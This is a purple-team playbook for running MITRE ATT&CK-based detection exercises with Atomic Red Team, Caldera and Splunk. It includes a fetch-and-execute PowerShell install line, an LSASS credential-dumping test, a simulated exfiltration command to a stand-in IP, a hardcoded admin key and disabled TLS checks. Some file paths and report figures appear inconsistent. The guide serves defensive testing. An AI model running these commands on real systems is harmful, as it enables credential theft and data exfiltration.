---
name: running-purple-team-exercises-with-mitre-attack
description: >-
  Plan, execute, and debrief structured purple team exercises using the MITRE
  ATT&CK framework to validate detection and response capabilities against
  realistic adversary TTPs. Covers exercise scoping against threat intelligence,
  atomic TTP execution with Atomic Red Team and Caldera, real-time detection
  validation with the blue team, findings triage, detection gap closure, and
  program metrics for continuous security posture improvement.
domain: cybersecurity
subdomain: red-teaming
tags:
  - purple-team
  - mitre-attack
  - adversarial-simulation
  - atomic-red-team
  - caldera
  - detection-validation
  - threat-intelligence
  - continuous-improvement
version: '1.0'
author: emmanuelokonkwo
license: Apache-2.0
nist_csf:
  - ID.RA-01
  - DE.CM-09
  - RS.AN-01
  - ID.IM-02
  - GV.RM-06
d3fend_techniques:
  - Decoy Environment
  - Network Traffic Analysis
  - Log Analysis
---

# Running Purple Team Exercises with MITRE ATT&CK

## When to Use

- When you need empirical evidence of whether existing detections catch real adversary TTPs
- When detection rules exist on paper but have never been validated against actual technique execution
- When threat intelligence identifies a specific threat actor targeting your sector and you need to test your coverage against their known TTPs
- When preparing for a red team engagement and wanting to pre-validate detection baselines
- When building a repeatable, metrics-driven security improvement program beyond one-off penetration tests

**Do not use** in production environments without explicit authorization and change management approval; always execute in isolated lab or staging environments unless scoped differently by executive sign-off.

## Prerequisites

- Written authorization from CISO and system owners covering scope, dates, and techniques
- Isolated test environment mirroring production (similar OS versions, EDR agents, log forwarding)
- MITRE ATT&CK Navigator for technique selection and coverage tracking
- Atomic Red Team installed on Windows/Linux test endpoints (`iex (iwr -useb https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1)`)
- MITRE Caldera server deployed for automated adversary emulation (optional)
- Blue team access to SIEM with real-time alert visibility during execution
- A shared exercise tracker (spreadsheet or Jira board) visible to both teams

## Workflow

### Step 1: Scope the Exercise Against Threat Intelligence

Select TTPs based on threat actors relevant to your industry vertical, not random coverage.

```python
# scripts/scope_exercise.py — map threat actor TTPs to ATT&CK Navigator layer
import json
from pathlib import Path

# Known TTPs for a financially-motivated threat actor (example: FIN7)
THREAT_ACTOR_TTPS = {
    "actor": "FIN7",
    "source": "MITRE ATT&CK G0046",
    "techniques": [
        {"id": "T1566.001", "name": "Spearphishing Attachment", "tactic": "initial-access"},
        {"id": "T1059.001", "name": "PowerShell", "tactic": "execution"},
        {"id": "T1547.001", "name": "Registry Run Keys", "tactic": "persistence"},
        {"id": "T1055",     "name": "Process Injection", "tactic": "defense-evasion"},
        {"id": "T1003.001", "name": "LSASS Memory", "tactic": "credential-access"},
        {"id": "T1082",     "name": "System Information Discovery", "tactic": "discovery"},
        {"id": "T1021.002", "name": "SMB/Windows Admin Shares", "tactic": "lateral-movement"},
        {"id": "T1041",     "name": "Exfiltration Over C2 Channel", "tactic": "exfiltration"},
    ]
}

# Generate ATT&CK Navigator layer for exercise scoping
layer = {
    "name": f"Purple Team Scope - {THREAT_ACTOR_TTPS['actor']}",
    "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
    "domain": "enterprise-attack",
    "techniques": [
        {"techniqueID": t["id"], "color": "#ff6666", "comment": f"Exercise target - {t['tactic']}"}
        for t in THREAT_ACTOR_TTPS["techniques"]
    ]
}

Path("exercise_scope.json").write_text(json.dumps(layer, indent=2))
print(f"Exercise scope: {len(THREAT_ACTOR_TTPS['techniques'])} techniques targeting {THREAT_ACTOR_TTPS['actor']} TTPs")
print("Import exercise_scope.json into ATT&CK Navigator for visualization")
```

### Step 2: Build the Exercise Tracker

Create a shared tracker that both red and blue teams update in real time during execution.

```python
# scripts/build_tracker.py — generate exercise tracking spreadsheet structure
import json
from pathlib import Path

TECHNIQUES = [
    "T1566.001", "T1059.001", "T1547.001", "T1055",
    "T1003.001", "T1082", "T1021.002", "T1041"
]

tracker = []
for tech_id in TECHNIQUES:
    tracker.append({
        "technique_id": tech_id,
        "atomic_test_id": "",          # filled by red team before execution
        "execution_timestamp": "",     # filled during execution
        "test_system": "",             # hostname/IP of target system
        "red_team_notes": "",          # what was executed, any errors
        "blue_team_detected": None,    # True/False/None=not-yet
        "detection_source": "",        # SIEM rule name, EDR alert, etc.
        "detection_latency_seconds": None,
        "blue_team_notes": "",
        "outcome": "",                 # DETECTED / MISSED / PARTIAL
        "gap_ticket": ""               # Jira/GitHub issue for missed detections
    })

Path("exercise_tracker.json").write_text(json.dumps(tracker, indent=2))
print(f"Tracker created for {len(tracker)} techniques")
```

### Step 3: Execute Atomic Tests (Red Team)

Run Atomic Red Team tests on target systems, one technique at a time, coordinating with the blue team.

```powershell
# On Windows test endpoint — install Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# List available tests for a technique
Invoke-AtomicTest T1003.001 -ShowDetailsBrief

# Execute a specific test (test #1 — LSASS via Task Manager)
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Execute with custom parameters
Invoke-AtomicTest T1059.001 -TestNumbers 4 -InputArgs @{
    "encoded_command" = "V2hvYW1p"  # base64 'Whoami'
}

# Clean up after each test (critical for not polluting the environment)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -Cleanup
```

```bash
# On Linux test endpoint
cd /opt/atomicredteam/atomics

# Execute T1082 (System Information Discovery) atomics
bash T1082/T1082.sh

# Execute T1041 (Exfil over C2) — DNS exfiltration simulation
python3 T1041/src/T1041.py --destination 192.0.2.100 --data "sensitive_data_test"
```

### Step 4: Run Automated Adversary Emulation with Caldera

Use MITRE Caldera to execute multi-step adversary profiles automatically for longer kill-chain exercises.

```bash
# Deploy Caldera server
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python3 server.py --insecure  # use TLS in production exercises

# Caldera REST API — create an adversary profile from selected techniques
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "FIN7 Simulation",
    "description": "Purple team exercise - FIN7 TTP profile",
    "atomic_ordering": [
      "43b3d740-56a0-4a11-b929-6ef8078eba04",
      "90c2efaa-8205-480d-8bb6-61d90dbaf81b"
    ]
  }'

# Deploy agent to test endpoint and trigger operation
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "FIN7 Purple Team Run 1",
    "adversary": {"adversary_id": "ADVERSARY_ID"},
    "group": "purple-team-targets",
    "planner": {"id": "atomic"}
  }'
```

### Step 5: Real-Time Detection Validation (Blue Team)

While the red team executes, the blue team monitors the SIEM and records detection outcomes.

```python
# scripts/validate_detections.py — query Splunk for alerts generated during exercise window
import requests, json, os
from datetime import datetime, timedelta

SPLUNK_HOST = os.environ.get("SPLUNK_HOST")
SPLUNK_TOKEN = os.environ.get("SPLUNK_TOKEN")

def query_splunk_for_technique(technique_id, start_time, end_time):
    spl = f"""
    index=security_alerts OR index=endpoint
    earliest="{start_time}" latest="{end_time}"
    | search mitre_technique_id="{technique_id}" OR tags="{technique_id}"
    | stats count by source, rule_name, host, _time
    """
    response = requests.post(
        f"https://{SPLUNK_HOST}:8089/services/search/jobs/export",
        auth=("", SPLUNK_TOKEN),
        data={"search": f"search {spl}", "output_mode": "json"},
        verify=False  # use VERIFY_TLS=true in production
    )
    results = [json.loads(line) for line in response.text.strip().split('\n') if line]
    return results

# Record detection outcome in tracker
def record_outcome(tracker, technique_id, detected, source, latency):
    for entry in tracker:
        if entry["technique_id"] == technique_id:
            entry["blue_team_detected"] = detected
            entry["detection_source"] = source
            entry["detection_latency_seconds"] = latency
            entry["outcome"] = "DETECTED" if detected else "MISSED"
            break
```

### Step 6: Score Results and Generate Gap Report

After the exercise, calculate detection rates per tactic and generate a gap closure plan.

```python
# scripts/score_exercise.py — compute metrics and produce findings report
import json
from pathlib import Path
from collections import defaultdict

tracker = json.loads(Path("exercise_tracker.json").read_text())

total = len(tracker)
detected = sum(1 for t in tracker if t["outcome"] == "DETECTED")
partial = sum(1 for t in tracker if t["outcome"] == "PARTIAL")
missed = sum(1 for t in tracker if t["outcome"] == "MISSED")

latencies = [t["detection_latency_seconds"] for t in tracker
             if t["detection_latency_seconds"] is not None]
avg_latency = sum(latencies) / len(latencies) if latencies else 0

gaps = [t for t in tracker if t["outcome"] in ("MISSED", "PARTIAL")]

report = {
    "exercise_date": "2026-06-06",
    "threat_actor_emulated": "FIN7",
    "total_techniques": total,
    "detected": detected,
    "partial": partial,
    "missed": missed,
    "detection_rate_pct": round(detected / total * 100, 1),
    "avg_detection_latency_seconds": round(avg_latency, 1),
    "detection_gaps": [
        {
            "technique_id": g["technique_id"],
            "red_team_notes": g["red_team_notes"],
            "remediation": "Create Sigma rule and deploy via DaC pipeline",
            "priority": "HIGH" if "credential" in g.get("red_team_notes", "").lower() else "MEDIUM"
        }
        for g in gaps
    ]
}

Path("exercise_report.json").write_text(json.dumps(report, indent=2))
print(json.dumps(report, indent=2))
```

### Step 7: Close Detection Gaps

For each missed technique, create a detection engineering ticket and track closure in the next exercise cycle.

```bash
# Create Jira tickets for each gap (using jira-cli or REST API)
for gap in $(jq -c '.detection_gaps[]' exercise_report.json); do
    TECH_ID=$(echo $gap | jq -r '.technique_id')
    PRIORITY=$(echo $gap | jq -r '.priority')

    curl -X POST https://your-org.atlassian.net/rest/api/3/issue \
      -H "Authorization: Bearer $JIRA_TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"fields\": {
          \"project\": {\"key\": \"DET\"},
          \"summary\": \"[Purple Team Gap] Create detection for $TECH_ID\",
          \"description\": \"Technique $TECH_ID was not detected during FIN7 purple team exercise on 2026-06-06. Create and deploy Sigma rule via DaC pipeline.\",
          \"issuetype\": {\"name\": \"Task\"},
          \"priority\": {\"name\": \"$PRIORITY\"},
          \"labels\": [\"purple-team\", \"detection-gap\", \"$TECH_ID\"]
        }
      }"
done
```

## Key Concepts

| Term | Definition |
|---|---|
| Purple Team | Collaborative adversarial simulation where red (offense) and blue (defense) teams work together transparently to validate and improve detection coverage |
| Atomic Test | A single, minimal, self-contained TTP execution mapped to a specific MITRE ATT&CK technique, as defined in the Atomic Red Team library |
| Detection Rate | Percentage of executed techniques that generated a SIEM alert or EDR detection within the observation window |
| Detection Latency | Time elapsed between TTP execution and blue team alert acknowledgment; key metric for MTTR improvement |
| Adversary Profile (Caldera) | A sequenced set of ATT&CK techniques that Caldera executes automatically to simulate a multi-stage attack chain |
| Coverage Gap | A technique executed during the exercise that produced no alert or detection in the SIEM or EDR platform |
| Assumed Breach | Purple team exercise premise where the red team starts with foothold access already established, skipping initial access, to focus on post-compromise TTPs |
| TTP Fidelity | The degree to which an atomic test accurately replicates the original adversary technique; high-fidelity tests use real tools (Mimikatz) vs. simulation |

## Tools & Systems

- **MITRE ATT&CK Navigator**: Coverage visualization and technique selection for exercise scoping
- **Atomic Red Team**: Open-source library of 1,000+ atomic tests mapped to ATT&CK techniques
- **Invoke-AtomicRedTeam**: PowerShell module for executing Atomic Red Team tests on Windows endpoints
- **MITRE Caldera**: Automated adversary emulation platform for multi-step kill-chain simulation
- **Splunk / Sentinel / Elastic**: SIEM platforms monitored by the blue team during execution
- **CrowdStrike Falcon / SentinelOne / Defender**: EDR platforms generating telemetry for blue team review
- **Jira / GitHub Issues**: Gap closure ticket tracking across exercise cycles

## Common Scenarios

### Scenario: Validating EDR Coverage Before a Red Team Engagement

**Context**: A 12-month red team engagement is scheduled. The security team wants to establish a detection baseline so the red team's findings distinguish genuine capability gaps from tooling gaps.

**Approach**:
1. Run a 2-day purple team exercise covering the top 20 ATT&CK techniques by EPSS-weighted prevalence
2. Record detection rate per tactic: initial access 60%, credential access 45%, lateral movement 30%
3. Address the critical gaps (pass-the-hash, LSASS dumping) with Sigma rules via the DaC pipeline
4. Re-run the affected atomics one week later; validate detection rate improved to >80% for those techniques
5. Share the baseline coverage Navigator layer with the red team so they can plan novel techniques

### Scenario: Sector-Specific Threat Emulation After a Peer Breach

**Context**: A competitor in the financial sector was breached by Scattered Spider. The CISO wants to know if the organization would have detected the same TTPs.

**Approach**:
1. Pull Scattered Spider's known TTPs from MITRE ATT&CK (G1015) and recent threat intel reports
2. Scope a focused 1-day exercise to 15 techniques aligned to the reported attack chain
3. Execute in a staging environment mirroring the production identity stack (Okta, Entra ID, Salesforce)
4. Find that social engineering-based MFA bypass (T1621) and SIM-swapping support vector have no detection
5. Deploy behavioral analytics rules for impossible travel and MFA push fatigue within 2 weeks

## Output Format

```json
{
  "exercise": {
    "name": "FIN7 Purple Team Exercise Q2 2026",
    "date": "2026-06-06",
    "duration_hours": 8,
    "environment": "staging",
    "threat_actor_emulated": "FIN7 (G0046)"
  },
  "results": {
    "total_techniques": 8,
    "detected": 5,
    "partial": 1,
    "missed": 2,
    "detection_rate_pct": 62.5,
    "avg_detection_latency_seconds": 47
  },
  "by_tactic": {
    "initial-access": {"tested": 1, "detected": 1, "rate": "100%"},
    "execution": {"tested": 1, "detected": 1, "rate": "100%"},
    "persistence": {"tested": 1, "detected": 0, "rate": "0%"},
    "defense-evasion": {"tested": 1, "detected": 1, "rate": "100%"},
    "credential-access": {"tested": 1, "detected": 1, "rate": "100%"},
    "discovery": {"tested": 1, "detected": 0, "rate": "0%"},
    "lateral-movement": {"tested": 1, "detected": 1, "rate": "100%"},
    "exfiltration": {"tested": 1, "detected": 1, "rate": "100%"}
  },
  "detection_gaps": [
    {
      "technique_id": "T1547.001",
      "name": "Registry Run Keys / Startup Folder",
      "priority": "HIGH",
      "gap_ticket": "DET-442",
      "remediation": "Deploy Sigma rule proc_creation_win_reg_run_key.yml via DaC pipeline"
    },
    {
      "technique_id": "T1082",
      "name": "System Information Discovery",
      "priority": "MEDIUM",
      "gap_ticket": "DET-443",
      "remediation": "Tune existing rule to reduce false-positive rate and re-enable"
    }
  ],
  "next_exercise_date": "2026-09-06",
  "target_detection_rate": "80%"
}
```
